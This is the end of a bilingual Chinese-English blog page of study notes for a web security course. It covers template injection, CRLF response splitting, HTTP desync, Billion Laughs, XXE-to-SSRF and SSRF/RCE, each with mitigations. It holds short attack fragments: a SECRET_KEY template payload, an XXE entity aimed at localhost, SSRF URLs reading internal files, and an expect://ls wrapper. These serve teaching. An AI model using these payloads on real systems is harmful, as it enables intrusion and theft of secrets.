`&#123;&#123;settings.SECRET_KEY&#125;&#125;`</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 不允许用户直接在模板中输入信息</span><br><span class="line"><span class="number">2.</span> 始终对用户输入进行**清理 Sanitise**</span><br><span class="line"><span class="number">3.</span> 使用 WAF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### HTTP Splitting/Smuggling 拆分</span><br><span class="line"></span><br><span class="line">###### 定义</span><br><span class="line"></span><br><span class="line">&gt; 它基本上是使用攻击者的输入恶意地从服务器拆分响应。通常发现于未经消毒的用户输入中, 反映在响应中</span><br><span class="line"></span><br><span class="line">###### Carriage Return Line Feed (CRLF)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 回车线路馈送</span><br><span class="line"><span class="number">2.</span> 字符:  `\r`, `\n`</span><br><span class="line"><span class="number">3.</span> URL encoded:  `%<span class="number">0</span>d`, `%<span class="number">0</span>a`</span><br><span class="line"><span class="number">4.</span> 用于终止线路</span><br><span class="line"><span class="number">5.</span> 可恶意用于拆分响应</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 清理用户输入</span><br><span class="line"><span class="number">2.</span> 筛选用户输入以忽略 `\r`, `\n` 和 `%<span class="number">0</span>d`, `%<span class="number">0</span>a`</span><br><span class="line"><span class="number">3.</span> 使用 WAF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### HTTP Desynchronisation Attacks HTTP去同步攻击</span><br><span class="line"></span><br><span class="line">######  **定义**</span><br><span class="line"></span><br><span class="line">&gt; 前端和后端服务器之间的不同步, 与某种代理或缓存服务器相关, 类似于缓冲区溢出</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 如果您没有 CDN、反向代理或负载均衡器, 则不会受到攻击。</span><br><span class="line"><span class="number">2.</span> 将前端配置为独占使用 HTTP/<span class="number">2</span></span><br><span class="line"><span class="number">3.</span> 根据有效负载大小检查内容长度标头值</span><br><span class="line"></span><br><span class="line">#### Web Cache Deception 网络缓存欺骗</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## (XXE)</span><br><span class="line"></span><br><span class="line">#### XML eXternal Entities (XXE) XML 的外部实体</span><br><span class="line"></span><br><span class="line">&gt; 利用应用程序处理 XML 信息。 </span><br><span class="line">&gt;</span><br><span class="line">&gt; 文档类型定义: 定义 XML 文档的结构, 不同类型的 XML 文档将使用不同的**DTD**。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 例如: XHTML严格使用不同的**DTO**到XHTML过渡</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### Billion Laughs</span><br><span class="line"></span><br><span class="line">以递归方式引用实体, 消耗服务器资源</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 定义一个实体（如 CDATA lol）</span><br><span class="line"><span class="number">2.</span> 定义更多多次引用前一个实体的实体</span><br><span class="line"><span class="number">3.</span> 使用的实体级别越多, 漏洞利用就越有效</span><br><span class="line"></span><br><span class="line">###### Impact</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 此漏洞以指数级增长</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 限制允许处理的递归实体的数量</span><br><span class="line"><span class="number">2.</span> 配置分析器以安全地处理 XML 实体</span><br><span class="line"><span class="number">3.</span> 仅处理受信任的 DTD 文件</span><br><span class="line"><span class="number">4.</span> 不处理内联实体</span><br><span class="line"><span class="number">5.</span> 限制解析器和应用程序可用的内存量: 这可确保对一个应用程序的拒绝服务不会影响不是同一服务器的其他应用程序（或同一应用程序的其他部分）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 通过XEE实现SSRF</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line"><span class="comment">// https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf</span></span><br><span class="line">!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY attack SYSTEM <span class="string">&quot;http://locahost/&#123;path&#125;&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></li>
+</ol></li>
+</ol>
+<h2 id="server-side-request-forgery-ssrf-服务器端请求伪造">Server-Side
+Request Forgery (SSRF) 服务器端请求伪造</h2>
+<h4 id="data-exfiltration-数据泄露">Data Exfiltration 数据泄露</h4>
+<h6 id="定义-2">定义</h6>
+<blockquote>
+<p>从服务器窃取数据, 可以通过多种方式完成: 包括通过HTTP, DNS,
+甚至通过访问特定页面！ 可以帮助窃取密码文件,
+配置文件和各种敏感信息。</p>
+</blockquote>
+<h4
+id="根据泄漏的dynamic-url-parameter发起伪造服务端请求">根据泄漏的Dynamic
+URL &amp; Parameter发起伪造服务端请求</h4>
+<h6 id="exploit-7">Exploit</h6>
+<ol type="1">
+<li>External:
+<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&#123;external_website&#125;</code></li>
+<li>Internal:
+<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=http://localhost:&#123;vulnerable_port&#125;/path/file.txt</code></li>
+</ol>
+<h4 id="remote-code-execution-rce-远程执行代码"><strong>Remote Code
+Execution (RCE) 远程执行代码</strong></h4>
+<ol type="1">
+<li>尝试使用 <code>expect://</code>
+<ol type="1">
+<li>这是一个需要显式启用的包装器, 例如: <code>expect://ls</code></li>
+</ol></li>
+<li>还可以使用其他协议来发挥您的优势, 例如: <code>gopher:</code></li>
+</ol>
+<h2 id="authorisation-vs-authentication">Authorisation vs
+Authentication</h2>
+<h2 id="serialisation-vs-deserialisation">Serialisation vs
+Deserialisation</h2>
+<p><strong>Serialisation</strong>: Marshalling,
+<code>Data Structure =&gt; String/Buffer</code>
+<strong>Deserialisation</strong>: Unmarshalling,
+<code>String/Buffer =&gt; Data Structure</code></p>
+
+  </div>
+    <hr>
+    <br>
+   <!-- <div>阅读次数<span id="busuanzi_value_page_pv"></span>次</div> -->
+   <div>Posts Contains: <span class="post-count">3.7k</span> Words</div>
+   <!-- <div>Reading Time: <span class="post-count">16</span>Min's</div> -->
+     <!-- 打赏 -->
+     <!-- 打赏功能开关-->
+      <!-- 添加捐赠图标 -->
+<div class ="post-donate">
+    <div id="donate_board" class="donate_bar center">
+        <div>👉🏻<a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">🧧</a>👈🏻</div>
+        <span class="donate_txt">
+           ↑<br>
+           • 打赏小周 • <!--这个值配置在主题的._config.yml中-->
+        </span>
+        <br>
+      </div>  
+    <div id="donate_guide" class="donate_bar center hidden" >
+        <!-- 支付宝打赏图案 -->
+        <!-- <img src="./images/WeChatpay.jpg" alt="支付宝打赏"> -->
+        <!-- 微信打赏图案 -->
+        <img src="https://zhidongzhou.github.io/z/images/weChatPay.jpg" alt="微信打赏">
+    </div>
+    <script type="text/javascript">
+        document.getElementById('btn_donate').onclick = function(){
+            $('#donate_board').addClass('hidden');
+            $('#donate_guide').removeClass('hidden');
+        }
+    </script>
+</div>
+<!-- 添加捐赠图标 -->
+    
+</article>
+<div><!-- Valine -->
+
+    <div class="blog-post-comments">
+        <section id="comment">
+            <div id="valine_container" class="valine_thread"></div>
+        </section>
+        <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+        <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+        <script>
+            var GUEST_INFO = ['nick', 'mail', 'link'];
+            var guest_info = 'nick,mail,link'.split(',').filter(function (item) {
+                return GUEST_INFO.indexOf(item) > -1
+            });
+            var notify = 'true' == true;
+            var verify = 'false' == true;
+            var valine = new Valine();
+            valine.init({
+                el: '#valine_container',
+                notify: notify,
+                verify: verify,
+                appId: "tPqQzJulKGGdtnC1z2YQUn1W-gzGzoHsz",
+                appKey: "F7c8R6ipy1FgLulcivI5BU0e",
+                placeholder: "Leave Comments · · ·",
+                pageSize: '10',
+                avatar: 'retro',
+                lang: 'en'
+            })
+        </script>
+    </div>
+
+</div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">🔍</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
+网络安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
+vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies 信息记录程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
+域名服务系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronous异步
+JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
+(DOM) 文档对象模型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
+参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping 浏览器分页绑架</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking 点击劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-2"><span class="toc-number">1.4.0.5.0.1.</span> <span class="toc-text">Impact</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#subdomain-takeovers"><span class="toc-number">1.4.0.6.</span> <span class="toc-text">Subdomain Takeovers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli"><span class="toc-number">1.5.</span> <span class="toc-text">SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E4%B8%A4%E7%A7%8Dcomment"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">SQL两种Comment</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-injection-union-attacks"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">SQL
+injection UNION attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get-database-version"><span class="toc-number">1.5.0.2.0.1.</span> <span class="toc-text">Get Database Version</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-schema-name"><span class="toc-number">1.5.0.2.0.2.</span> <span class="toc-text">GET Schema Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-table-name"><span class="toc-number">1.5.0.2.0.3.</span> <span class="toc-text">Get Table Name</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#get-string-value"><span class="toc-number">1.5.0.2.0.4.</span> <span class="toc-text">Get String Value</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#retrieve-multiple-values-in-a-single-column"><span class="toc-number">1.5.0.2.0.5.</span> <span class="toc-text">Retrieve Multiple
+Values in a Single Column</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#authentication-bypass-with-limit"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">Authentication Bypass with
+LIMIT</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-4"><span class="toc-number">1.5.0.3.0.1.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation"><span class="toc-number">1.5.0.3.0.2.</span> <span class="toc-text">Mitigation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-wildcard-attack"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">SQL Wildcard Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-5"><span class="toc-number">1.5.0.4.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cross-site-request-forgery-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-csrf"><span class="toc-number">1.6.</span> <span class="toc-text">Cross-Site
+Request Forgery 跨站点请求伪造 (CSRF)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mitigation-1"><span class="toc-number">1.6.0.0.0.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-6"><span class="toc-number">1.6.0.0.0.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#server-side-request-forgery-ssrf-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.7.</span> <span class="toc-text">Server-Side
+Request Forgery (SSRF) 服务器端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-exfiltration-%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Data Exfiltration 数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.7.0.1.0.1.</span> <span class="toc-text">定义</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%B3%84%E6%BC%8F%E7%9A%84dynamic-url-parameter%E5%8F%91%E8%B5%B7%E4%BC%AA%E9%80%A0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">根据泄漏的Dynamic
+URL &amp; Parameter发起伪造服务端请求</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-7"><span class="toc-number">1.7.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#remote-code-execution-rce-%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Remote Code
+Execution (RCE) 远程执行代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#authorisation-vs-authentication"><span class="toc-number">1.8.</span> <span class="toc-text">Authorisation vs
+Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialisation-vs-deserialisation"><span class="toc-number">1.9.</span> <span class="toc-text">Serialisation vs
+Deserialisation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yumtaro.com/archives/0.html/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yumtaro.com/archives/0.html/&text=COMP90074 网络安全"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yumtaro.com/archives/0.html/&is_video=false&description=COMP90074 网络安全"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=COMP90074 网络安全&body=Check out this article: https://yumtaro.com/archives/0.html/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yumtaro.com/archives/0.html/&title=COMP90074 网络安全"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yumtaro.com/archives/0.html/&name=COMP90074 网络安全&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yumtaro.com/archives/0.html/&t=COMP90074 网络安全"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div>
+    
+      <script src='https://unpkg.com/mermaid@8.5/dist/mermaid.min.js'></script>
+      <script>
+        if (window.mermaid) {
+          mermaid.initialize({
+            theme: 'default',
+            "flowchart": {
+              curve: 'basis'
+          }
+          });
+        }
+      </script>
+    
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    Darren Z
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">🔍</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+
+
+    <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+    <script>AV.initialize("tPqQzJulKGGdtnC1z2YQUn1W-gzGzoHsz", "F7c8R6ipy1FgLulcivI5BU0e");</script>
+    <script>
+      function showTime(Counter) {
+        var query = new AV.Query(Counter);
+        var entries = [];
+        var $visitors = $(".leancloud_visitors");
+  
+        $visitors.each(function () {
+          entries.push( $(this).attr("id").trim() );
+        });
+  
+        query.containedIn('url', entries);
+        query.find()
+          .done(function (results) {
+            var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+  
+            if (results.length === 0) {
+              $visitors.find(COUNT_CONTAINER_REF).text(0);
+              return;
+            }
+  
+            for (var i = 0; i < results.length; i++) {
+              var item = results[i];
+              var url = item.get('url');
+              var time = item.get('time');
+              var element = document.getElementById(url);
+  
+              $(element).find(COUNT_CONTAINER_REF).text(time);
+            }
+            for(var i = 0; i < entries.length; i++) {
+              var url = entries[i];
+              var element = document.getElementById(url);
+              var countSpan = $(element).find(COUNT_CONTAINER_REF);
+              if( countSpan.text() == '') {
+                countSpan.text(0);
+              }
+            }
+          })
+          .fail(function (object, error) {
+            console.log("Error: " + error.code + " " + error.message);
+          });
+      }
+  
+      function addCount(Counter) {
+        var $visitors = $(".leancloud_visitors");
+        var url = $visitors.attr('id').trim();
+        var title = $visitors.attr('data-flag-title').trim();
+        var query = new AV.Query(Counter);
+  
+        query.equalTo("url", url);
+        query.find({
+          success: function(results) {
+            if (results.length > 0) {
+              var counter = results[0];
+              counter.fetchWhenSave(true);
+              counter.increment("time");
+              counter.save(null, {
+                success: function(counter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                },
+                error: function(counter, error) {
+                  console.log('Failed to save Visitor num, with error message: ' + error.message);
+                }
+              });
+            } else {
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            }
+          },
+          error: function(error) {
+            console.log('Error:' + error.code + " " + error.message);
+          }
+        });
+      }
+  
+      $(function() {
+        var Counter = AV.Object.extend("Counter");
+        if ($('.leancloud_visitors').length == 1) {
+          addCount(Counter);
+        } else if ($('.post-title-link').length > 1) {
+          showTime(Counter);
+        }
+      });
+    </script>
+  
+
